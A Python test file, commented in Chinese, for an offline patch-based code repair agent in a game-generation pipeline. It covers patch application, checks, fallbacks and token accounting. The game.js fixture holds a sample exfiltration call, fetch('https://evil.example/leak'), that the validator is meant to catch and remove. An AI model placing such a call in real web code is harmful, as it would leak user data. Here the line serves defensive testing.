"""repair 内层 agent：会话工具语义 + 节点接线/回退（全部离线，不触网不依赖 SDK）。"""
from app.agents import code_agent, nodes


def _files():
    return [
        {
            "path": "index.html",
            "content": '<html><head></head><body><canvas id="stage"></canvas><script src="game.js"></script></body></html>',
        },
        {"path": "style.css", "content": "canvas{display:block}"},
        {"path": "game.js", "content": "var score = 0; fetch('https://evil.example/leak');"},
    ]


def _patch(old: str, new: str, path: str = "game.js") -> str:
    return (
        "*** Begin Patch\n"
        f"*** Update File: {path}\n"
        f"-{old}\n"
        f"+{new}\n"
        "*** End Patch"
    )


def _outcome(**overrides):
    base = dict(
        files=_files(),
        changed=["game.js"],
        tokens=321,
        logs=["agent patched game.js (1 chunk(s), 24B)"],
        note="FIXED: removed fetch call",
        checks_ok=True,
        turns=3,
    )
    base.update(overrides)
    return code_agent.RepairOutcome(**base)


# ---- RepairSession 工具面 ----

def test_session_read_patch_checks_roundtrip():
    s = code_agent.RepairSession.from_files(_files())
    assert "fetch" in s.read_file("game.js")
    report = s.run_checks()
    assert "CHECKS FAILED" in report and "fetch()" in report
    assert not s.checks_ok

    out = s.apply_patch(
        "```patch\n"
        + _patch(
            "var score = 0; fetch('https://evil.example/leak');",
            "var score = 0; function tick() { score += 1; }",
        )
        + "\n```",
    )
    assert "run_checks" in out
    assert s.changed == {"game.js"}
    report = s.run_checks()
    assert "ALL CHECKS PASSED" in report
    assert s.checks_ok

    files = s.to_files()
    assert [f["path"] for f in files] == ["index.html", "style.css", "game.js"]
    assert "fetch" not in files[2]["content"]


def test_session_patch_resets_checks_flag():
    s = code_agent.RepairSession.from_files(_files())
    s.apply_patch(_patch("var score = 0; fetch('https://evil.example/leak');", "var ok = 1;"))
    s.run_checks()
    assert s.checks_ok
    s.apply_patch(_patch("var ok = 1;", "var broken = ;"))
    assert not s.checks_ok  # 新编辑未复检前不可视为通过


def test_session_rejects_unknown_path_and_oversize():
    s = code_agent.RepairSession.from_files(_files())
    assert "not editable" in s.apply_patch(_patch("x", "y", path="evil.js"))
    assert "no such file" in s.read_file("nope.js")
    big = "x" * (code_agent.validation.MAX_FILE_BYTES + 1)
    assert "exceeds" in s.apply_patch(
        _patch("var score = 0; fetch('https://evil.example/leak');", big)
    )
    assert s.changed == set()


def test_session_rejects_invalid_patch_inputs():
    s = code_agent.RepairSession.from_files(_files())
    # 非补丁文本：错误消息直接教 V4A 格式
    assert "Begin Patch" in s.apply_patch("replace everything")
    # 旧 unified diff：明确指路换格式
    unified = "--- a/game.js\n+++ b/game.js\n@@ -1 +1 @@\n-a\n+b"
    assert "unified diff" in s.apply_patch(unified)
    # 上下文与当前文件不符
    assert "context not found" in s.apply_patch(_patch("var missing = true;", "var ok = true;"))
    # bundle 文件集固定，Add/Delete 不支持
    add = "*** Begin Patch\n*** Add File: new.js\n+var x = 1;\n*** End Patch"
    assert "Update File" in s.apply_patch(add)
    # 截断的补丁（缺 *** End Patch）要求重发而不是半套用
    truncated = (
        "*** Begin Patch\n*** Update File: game.js\n"
        "-var score = 0; fetch('https://evil.example/leak');\n+var ok = 1;"
    )
    assert "End Patch" in s.apply_patch(truncated)
    assert s.changed == set()


def test_session_multifile_patch_is_atomic():
    s = code_agent.RepairSession.from_files(_files())
    patch = (
        "*** Begin Patch\n"
        "*** Update File: game.js\n"
        "-var score = 0; fetch('https://evil.example/leak');\n"
        "+var score = 0;\n"
        "*** Update File: style.css\n"
        "-canvas{display:block}\n"
        "+canvas{display:block;background:#000}\n"
        "*** End Patch"
    )
    out = s.apply_patch(patch)
    assert "game.js" in out and "style.css" in out
    assert s.changed == {"game.js", "style.css"}
    # 任一文件失败则整个补丁不落盘
    s2 = code_agent.RepairSession.from_files(_files())
    bad = patch.replace("-canvas{display:block}", "-canvas{display:none}")
    assert "context not found" in s2.apply_patch(bad)
    assert s2.changed == set() and "fetch" in s2.read_file("game.js")


def test_session_applies_anchored_section_patch():
    files = _files()
    files[2]["content"] = (
        "function setup() {\n  var a = 1;\n}\n"
        "function update() {\n  var a = 1;\n}\n"
    )
    s = code_agent.RepairSession.from_files(files)
    patch = (
        "*** Begin Patch\n"
        "*** Update File: game.js\n"
        "@@ function update() {\n"
        "-  var a = 1;\n"
        "+  var a = 2;\n"
        "*** End Patch"
    )
    assert "run_checks" in s.apply_patch(patch)
    body = s.read_file("game.js")
    # @@ 锚点必须命中第二处同名行，setup 里的保持不动
    assert "function setup() {\n  var a = 1;\n}" in body
    assert "function update() {\n  var a = 2;\n}" in body


def test_session_accepts_missing_begin_sentinel():
    s = code_agent.RepairSession.from_files(_files())
    patch = (
        "*** Update File: game.js\n"
        "-var score = 0; fetch('https://evil.example/leak');\n"
        "+var ok = 1;\n"
        "*** End Patch"
    )
    assert "run_checks" in s.apply_patch(patch)


def test_session_rejects_noop_patch():
    s = code_agent.RepairSession.from_files(_files())
    line = "var score = 0; fetch('https://evil.example/leak');"
    assert "no changes" in s.apply_patch(_patch(line, line))
    assert s.changed == set()


def test_session_preserves_crlf():
    files = _files()
    files[2]["content"] = "var a = 1;\r\nvar b = 2;\r\n"
    s = code_agent.RepairSession.from_files(files)
    patch = "*** Begin Patch\n*** Update File: game.js\n-var b = 2;\n+var b = 3;\n*** End Patch"
    assert "run_checks" in s.apply_patch(patch)
    assert s.contents["game.js"] == "var a = 1;\r\nvar b = 3;\r\n"


def test_skills_expose_runtime_contract():
    s = code_agent.RepairSession.from_files(_files())
    assert "gameweave-runtime" in s.list_skills()
    body = s.read_skill("gameweave-runtime")
    assert "postMessage" in body and "400KB" in body
    assert "unknown skill" in s.read_skill("nope")
    assert "unknown skill" in s.read_skill("../secrets")  # 路径穿越拒绝


def test_enabled_requires_flag_and_real_model(monkeypatch):
    monkeypatch.setattr(code_agent.settings, "CODE_AGENT_ENABLED", False)
    assert not code_agent.enabled({"use_real": True})
    monkeypatch.setattr(code_agent.settings, "CODE_AGENT_ENABLED", True)
    assert code_agent.enabled({"use_real": True})
    assert not code_agent.enabled({"use_real": False})
    assert not code_agent.enabled({})


# ---- 节点接线：agent 成功 / 不收敛回退 / 不可用回退 ----

def test_repair_node_uses_agent_outcome(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: _outcome())
    out = nodes.repair_code_node(
        {
            "repair_attempts": 0,
            "last_error": "forbidden API in game.js: fetch()",
            "generated_files": _files(),
            "use_real": True,
            "dimension": "2d",
        }
    )
    assert out["repair_attempts"] == 1
    assert out["_tokens_delta"] == 321
    assert out["_agent"] == "GameCodeAgentRepair"
    assert any("agent tool loop" in line for line in out["_logs"])
    assert any("agent self-checks passed" in line for line in out["_logs"])


def test_repair_node_falls_back_when_agent_unavailable(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: None)
    seen = {}

    def fake_generate(state, repair_error=None):
        seen["error"] = repair_error
        return _files(), 7, "template"

    monkeypatch.setattr(nodes, "_generate_code", fake_generate)
    out = nodes.repair_code_node(
        {"repair_attempts": 1, "last_error": "boom", "generated_files": _files(), "use_real": True}
    )
    assert seen["error"] == "boom"
    assert out["repair_attempts"] == 2
    assert out["_tokens_delta"] == 7
    assert any("falling back to full regeneration" in line for line in out["_logs"])


def test_repair_node_fallback_keeps_agent_tokens(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(
        code_agent, "run_repair", lambda files, **kw: _outcome(checks_ok=False, note="GIVEUP: cannot fix")
    )
    monkeypatch.setattr(nodes, "_generate_code", lambda state, repair_error=None: (_files(), 10, "template"))
    out = nodes.repair_code_node(
        {"repair_attempts": 0, "last_error": "boom", "generated_files": _files(), "use_real": True}
    )
    # agent 花掉的 tokens 也要并入步骤增量，与 LLMCall 记账口径一致
    assert out["_tokens_delta"] == 331
    assert any("did not converge" in line for line in out["_logs"])


def test_repair_node_legacy_path_when_disabled(monkeypatch):
    monkeypatch.setattr(nodes, "_generate_code", lambda state, repair_error=None: (_files(), 5, "template"))
    called = {"agent": False}
    monkeypatch.setattr(code_agent, "run_repair", lambda *a, **kw: called.__setitem__("agent", True))
    out = nodes.repair_code_node({"repair_attempts": 0, "last_error": "x", "generated_files": _files()})
    assert not called["agent"]  # 默认关闭：完全不进 agent 路径
    assert out["_tokens_delta"] == 5


def test_revision_repair_node_agent_path_requires_changes(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: _outcome(changed=[]))
    monkeypatch.setattr(
        nodes, "_generate_revision_code", lambda state, repair_error=None: (_files(), 4, ["game.js"], "model")
    )
    out = nodes.revision_repair_node(
        {
            "repair_attempts": 0,
            "last_error": "revision produced no file changes",
            "generated_files": _files(),
            "use_real": True,
            "task_kind": "revision",
            "base_version": "v2",
        }
    )
    # 空编辑不满足 revision 门禁 → 回落单次修订，但 agent tokens 保留
    assert out["_tokens_delta"] == 4 + 321
    assert out["revision_result"]["changed_files"] == ["game.js"]


def test_revision_repair_node_uses_agent_outcome(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: _outcome())
    out = nodes.revision_repair_node(
        {
            "repair_attempts": 0,
            "last_error": "forbidden API in game.js: fetch()",
            "generated_files": _files(),
            "use_real": True,
            "task_kind": "remix",
            "base_version": "v3",
        }
    )
    assert out["repair_attempts"] == 1
    assert out["revision_result"] == {"changed_files": ["game.js"], "base_version": "v3"}
    assert out["_tokens_delta"] == 321
    assert out["validation_result"] == {} and out["gameplay_qa_result"] == {}


def test_run_repair_returns_none_for_empty_bundle():
    assert code_agent.run_repair([], error="whatever") is None


def test_build_input_labels_failure_source():
    default = code_agent._build_input(_files(), "boom", "2d", None)
    assert default.startswith("Build validation failed with:")
    qa = code_agent._build_input(_files(), "boom", "2d", None, failure_label="Browser gameplay QA")
    assert qa.startswith("Browser gameplay QA failed with:")


# ---- gameplay repair：运行时报错走最小 patch，玩法指标仍整包重生成 ----

def _qa_result(issues):
    return {"passed": False, "issues": issues, "warnings": [], "metrics": {}}


def test_classify_gameplay_failure_runtime_vs_design():
    runtime = ["browser page error: TypeError: this.enemies.children.iterate is not a function"]
    kind, picked = nodes._classify_gameplay_failure(_qa_result(runtime))
    assert kind == "runtime" and picked == runtime
    # 崩溃伴随的零帧/超时是症状，不改变运行时判定
    kind, picked = nodes._classify_gameplay_failure(
        _qa_result(runtime + ["browser sandbox observed no game-loop activity"])
    )
    assert kind == "runtime" and picked == runtime
    # 混入玩法指标问题 → 必须整包重生成
    assert nodes._classify_gameplay_failure(_qa_result(runtime + ["no input handling found"]))[0] == "design"
    assert nodes._classify_gameplay_failure(_qa_result(["no input handling found"])) == ("design", [])
    # 只有症状没有报错，patch 无从下手
    assert nodes._classify_gameplay_failure(_qa_result(["browser sandbox observed no game-loop activity"]))[0] == "design"
    assert nodes._classify_gameplay_failure({})[0] == "design"


def test_gameplay_repair_patches_runtime_error(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    seen = {}

    def fake_repair(files, **kw):
        seen.update(kw)
        return _outcome()

    monkeypatch.setattr(code_agent, "run_repair", fake_repair)
    out = nodes.gameplay_repair_node(
        {
            "gameplay_repair_attempts": 0,
            "generated_files": _files(),
            "use_real": True,
            "dimension": "2d",
            "balance_config": {"target_score": 100},
            "gameplay_qa_result": _qa_result(
                ["browser page error: TypeError: this.enemies.children.iterate is not a function"]
            ),
        }
    )
    assert seen["failure_label"] == "Browser gameplay QA"
    assert "children.iterate" in seen["error"]
    assert out["gameplay_repair_attempts"] == 1
    assert out["generated_files"] == _files()
    assert out["_tokens_delta"] == 321
    assert out["validation_result"] == {} and out["gameplay_qa_result"] == {}
    # patch 不动设计与难度
    assert "balance_config" not in out and "game_design" not in out
    # patch 产物回外层门禁复检，而不是重新生成
    assert nodes.next_after_gameplay_repair(out) == "build_validation"


def test_gameplay_repair_empty_edit_falls_back_to_regeneration(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: _outcome(changed=[]))
    out = nodes.gameplay_repair_node(
        {
            "gameplay_repair_attempts": 0,
            "generated_files": _files(),
            "use_real": True,
            "gameplay_qa_result": _qa_result(["browser console error: boom"]),
        }
    )
    # 浏览器 bug 在 run_checks 里不复现，空编辑等于没修 → 回落整包重生成
    assert out["generated_files"] == []
    assert out["balance_config"]["repair_attempt"] == 1
    assert out["_tokens_delta"] == 321  # agent 花掉的 tokens 仍记账
    assert nodes.next_after_gameplay_repair(out) == "code_generation"


def test_gameplay_repair_design_issue_skips_agent(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    called = {"agent": False}
    monkeypatch.setattr(code_agent, "run_repair", lambda *a, **kw: called.__setitem__("agent", True))
    out = nodes.gameplay_repair_node(
        {
            "gameplay_repair_attempts": 0,
            "generated_files": _files(),
            "use_real": True,
            "gameplay_qa_result": _qa_result(["no input handling found"]),
        }
    )
    assert not called["agent"]  # 玩法指标问题不进 patch 路径
    assert out["generated_files"] == []
    assert out["balance_config"] and out["game_design"]
    assert out["_tokens_delta"] == 0


def test_gameplay_repair_legacy_path_when_disabled(monkeypatch):
    called = {"agent": False}
    monkeypatch.setattr(code_agent, "run_repair", lambda *a, **kw: called.__setitem__("agent", True))
    out = nodes.gameplay_repair_node(
        {
            "gameplay_repair_attempts": 1,
            "generated_files": _files(),
            "gameplay_qa_result": _qa_result(["browser page error: TypeError: boom"]),
        }
    )
    assert not called["agent"]  # 默认关闭：运行时报错也走旧的重生成路径
    assert out["generated_files"] == []
    assert out["gameplay_repair_attempts"] == 2
    # 开关没开导致的回落必须留痕，不能静默
    assert any("code agent disabled" in line for line in out["_logs"])
